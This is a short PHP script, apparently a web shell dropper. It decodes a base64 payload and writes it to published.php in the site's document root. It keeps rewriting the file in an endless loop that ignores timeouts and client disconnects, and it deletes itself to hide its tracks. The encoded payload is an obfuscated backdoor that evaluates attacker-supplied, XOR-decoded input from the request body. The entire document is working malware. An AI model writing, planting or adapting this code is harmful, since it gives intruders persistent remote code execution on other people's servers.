<?php
 ignore_user_abort(true);
  set_time_limit(0);
 $file = $_SERVER['DOCUMENT_ROOT'].DIRECTORY_SEPARATOR.'published.php';
 $shellcode = "PD9waHAKJFA9c3RyX3JlcGxhY2UoJ1V2JywnJywnY3JVdmVhVXZVdnRlX2ZVdnVVdm5VdmN0aW9uJyk7CiRGPSckaz0iYUU+OGQ0MDFlYiI7RT4ka0U+aD0iM0U+NWQyMmNjMjUxY2QiRT5FPjska0U+ZkU+PSI1YjkyOTZiOTY2MWQiO0U+JHA9IkdLOEU+RT5CQnplWFVqbGxVRmVYIjtFPmZ1bic7CiRFPSdFPkU+KCIvJGtoKC4rKSRrZi8iLEBmRT5pbEU+ZV9nZUU+dF9FPmNvbnRlRT5udHMoInBoRT5wOkU+Ly9pbnB1RT50IiksJG0pPT0xKSB7QG9iX3N0YUU+cnQoKUU+O0BldmEnOwokTj0nZW5kRT5fY2xFPmVhbigpO0U+RT4kcj1AYmFzZTZFPjRfZW5FPmNvZGUoQHgoQGd6Y0U+b21wcmVzRT5zKCRFPm8pLCRFPmspKTtwcmludCgiRT4kRT5wJGtoJHIka2YiKTt9JzsKJFU9J0U+bChAZ3p1bmNFPm9tcHJlRT5zRT5zKEB4KEBiRT5hc2U2NF9kZUU+Y29kZSgkbVsxXSlFPkU+LCRrKSlFPik7JG89QEU+b0U+Yl9nZXRfY29udGVudHMoKTtART5vYl8nOwokTD0nY3RFPmlvRT5uIHgoJHQsJGspRT57JGM9c3RFPnJsZW4oJGspRT47JGxFPj1zdHJsRT5lbigkdClFPkU+OyRvPSIiO2ZFPm9yKCRpRT49MDskaTwkbDspe2ZvcihFPiRFPic7CiRTPSdFPkU+aj0wOygkajwkYyYmJGk8JEU+bClFPjskaisrLCRpK0U+Kyl7JG8uPSRFPnR7JGl9XiRrRT57JGp9O319cmVFPnR1ckU+biAkbzt9aUU+ZiAoQHByZUU+Z19tRT5hdGNoJzsKJEE9c3RyX3JlcGxhY2UoJ0U+JywnJywkRi4kTC4kUy4kRS4kVS4kTik7CiRSPSRQKCcnLCRBKTskUigpOwo/Pg==";
 $code = base64_decode($shellcode);
 file_put_contents($file, $code);
while(true) {
       file_put_contents($file, $code);
      if(__FILE__){//删除自身，以免文件泄露
       unlink(__FILE__);
       }
}
?>
